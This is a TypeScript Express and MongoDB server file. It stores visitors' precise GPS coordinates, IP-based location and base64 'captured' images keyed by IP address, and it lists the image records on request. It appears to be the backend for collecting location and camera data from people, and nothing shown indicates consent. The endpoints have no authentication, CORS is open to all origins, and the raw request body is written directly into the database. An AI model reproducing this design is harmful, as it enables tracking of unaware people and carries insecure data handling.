import express from 'express';
import mongoose from 'mongoose';
import cors from 'cors';
import 'dotenv/config';

const app = express();

// --- Middleware ---
app.use(cors());
app.use(express.json({ limit: '500mb' }));

// --- MongoDB Connection ---
const connectDB = async () => {
  try {
    // Ensure you are using the correct variable name from your .env
    const connString = process.env.MONGO_URI_TEST || process.env.MONGO_URL;
    
    if (!connString) {
      throw new Error('MONGO_URI_TEST or MONGO_URL not set in .env');
    }

    // Mongoose connection with standard options
    await mongoose.connect(connString, {
      serverSelectionTimeoutMS: 5000, // Timeout after 5s instead of 30s
    });

    console.log('🚀 MongoDB Connected Successfully');
  } catch (err) {
    const errorMessage = err instanceof Error ? err.message : String(err);
    console.error('❌ MongoDB Connection Error:', errorMessage);
    // Suggestion: Check if your IP changed or if port 27017 is blocked
    process.exit(1);
  }
};

connectDB();

// --- Schema Definition ---
const UserDataSchema = new mongoose.Schema({
  accurateLocation: { 
    lat: Number, 
    lng: Number ,
    accurateLocation: String
  },
  ipLocation: { 
    ip: { type: String, required: true, index: true }, 
    city: String, 
    lat: Number, 
    lng: Number, 
    location: String 
  },
}, { 
  timestamps: true,
  versionKey: false 
});

// --- Image Schema (Separate Collection) ---
const ImageSchema = new mongoose.Schema({
  ip: { type: String, required: true, index: true },
  imageData: String,  // Base64 image
  capturedAt: { type: Date, default: Date.now, index: true }
}, {
  versionKey: false
});

const UserData = mongoose.model('UserData', UserDataSchema);
const ImageModel = mongoose.model('Image', ImageSchema);

// --- Routes ---
app.get('/', (req, res) => res.json({ status: "online", message: "Server is running" }));

app.post('/api/store', async (req, res) => {
  try {
    const { ipLocation } = req.body;

    if (!ipLocation?.ip) {
      return res.status(400).json({ error: "IP Address is required" });
    }

    const data = await UserData.findOneAndUpdate(
      { "ipLocation.ip": ipLocation.ip },
      { $set: req.body },
      { upsert: true, returnDocument: 'after', runValidators: true }
    );

    res.status(200).json({ 
      success: true, 
      id: data._id 
    });
  } catch (err) {
    console.error("Storage Error:", err);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// --- Update Image Data by IP ---
app.post('/api/update-image', async (req, res) => {
  try {
    const { ip, imageData } = req.body;

    if (!ip || !imageData) {
      return res.status(400).json({ error: "IP and Image Data are required" });
    }

    // Store image in separate collection
    const newImage = await ImageModel.create({
      ip,
      imageData
    });

    res.status(200).json({ 
      success: true, 
      id: newImage._id,
      message: "Image stored successfully"
    });
  } catch (err) {
    const errorMsg = err instanceof Error ? err.message : String(err);
    console.error("Update Error Details:", errorMsg);
    res.status(500).json({ error: "Internal Server Error", details: errorMsg });
  }
});

// --- Get Images by IP (NEW) ---
app.get('/api/images/:ip', async (req, res) => {
  try {
    const { ip } = req.params;
    const { limit = 10, skip = 0 } = req.query;

    const images = await ImageModel.find({ ip })
      .sort({ capturedAt: -1 })
      .limit(parseInt(limit as string))
      .skip(parseInt(skip as string));

    const count = await ImageModel.countDocuments({ ip });

    res.status(200).json({
      success: true,
      count: images.length,
      total: count,
      images: images.map(img => ({
        id: img._id,
        capturedAt: img.capturedAt
      }))
    });
  } catch (err) {
    const errorMsg = err instanceof Error ? err.message : String(err);
    console.error("Get Images Error:", errorMsg);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

const PORT = parseInt(process.env.PORT || '10000', 10);
app.listen(PORT, "0.0.0.0", () => {
  console.log(`📡 Server active on port ${PORT}`);
});
